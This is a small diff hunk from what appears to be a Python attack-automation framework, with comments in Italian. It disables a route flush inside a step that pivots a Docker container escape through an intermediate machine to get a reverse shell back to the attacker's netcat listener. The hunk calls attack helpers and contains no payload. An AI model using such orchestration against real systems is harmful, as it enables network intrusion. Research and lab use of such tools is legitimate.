@@ -94,7 +94,7 @@ def main_procedure(attacker_ip, config_file, attack_sequence_file=None, stealth=
 
                         #Viene fatto port forwarding (il docker escape viene fatto passare per la macchina intermedia che poi apre una reverse shell verso la macchina attaccante) 
                         #Altrimenti, essendo la macchina target e la macchina bersagio in diverse sottoreti, l'attacco non sarebbe possibile
-                            mc.route_flush()
+                            #mc.route_flush()
                             #mc.prepare(router["id_sess"], C.NETCAT_PORT, LPORT, attacker_ip)
                             docker_escape_attack_object = attack_db.create_attack("docker_escape", "0", attacker_ip, C.NETCAT_PORT)
                             docker_escape_success = mc.attempt_attack(docker_escape_attack_object)
